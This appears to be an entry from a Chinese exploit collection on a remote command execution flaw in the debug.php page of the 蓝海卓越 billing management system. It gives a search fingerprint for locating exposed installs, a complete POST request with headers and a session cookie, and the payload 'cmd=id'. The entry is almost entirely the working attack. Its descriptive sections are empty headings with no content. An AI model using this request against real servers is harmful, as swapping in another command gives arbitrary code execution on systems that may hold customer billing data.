# 蓝海卓越计费管理系统debug存在远程命令执行漏洞

- **系统**：蓝海卓越计费管理系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title=="蓝海卓越计费管理系统"`
- **请求**：`POST /debug.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 6`　`Cookie: PHPSESSID=6jvq6prlaoemtc00r7a876ntb4`　`Priority: u=1`

**请求体 / payload**
```
cmd=id
```

**其他**
- 蓝海卓越 计费管理系统debug存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝海卓越 计费管理系统